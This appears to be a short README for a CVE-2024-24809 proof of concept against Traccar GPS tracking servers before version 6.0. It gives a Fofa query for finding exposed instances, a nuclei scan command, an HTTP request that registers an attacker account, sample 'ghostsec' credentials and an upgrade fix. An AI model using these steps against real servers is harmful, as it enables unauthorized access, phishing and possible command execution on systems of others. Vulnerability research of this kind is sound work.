### CVE-2024-24809 Detail

#Description
Traccar is an open source GPS tracking system. Versions prior to 6.0 are vulnerable to path traversal and unrestricted upload of file with dangerous type. 
Since the system allows registration by default, attackers can acquire ordinary user permissions by registering an account and exploit this vulnerability to upload files with the prefix `device.` under 
any folder. Attackers can use this vulnerability for phishing, cross-site scripting attacks, and potentially execute arbitrary commands on the server. Version 6.0 contains a patch for the issue.

#usage
```bash
Fofa query : app="traccar"
```
```bash
nuclei --target {target.com} -t CVE-2024-24809.yaml
```
#Proof of concept (using burpsuite)
```bash
POST /api/users HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

{"name": "{{name}}", "email": "{{email}}", "password": "{{password}}", "totpKey": null}
```
#Testing account
```bash
name: "ghostsec"
password: "ghostsec"
email: "ghostsec@ghostsec.com"
```

### How to fix?
Upgrade org.traccar:traccar to version 6.0 or higher.
